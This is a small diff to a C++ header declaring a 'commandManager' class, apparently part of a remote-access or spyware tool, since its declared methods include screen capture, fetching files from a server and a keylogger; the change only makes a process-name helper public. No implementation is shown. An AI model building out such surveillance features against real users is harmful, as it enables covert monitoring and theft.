@@ -6,8 +6,7 @@
 
 class commandManager
 {
-private:
-	std::wstring pidToName(DWORD procID);
+//private:
 
 public:
 	ULONG64 screen_len = 0;
@@ -17,5 +16,6 @@ public:
 	LPVOID getScreen();
 	void getFile(std::string& path, LPCWSTR server);
 	void keyLogger();
+	std::wstring pidToName(DWORD procID);
 };
 
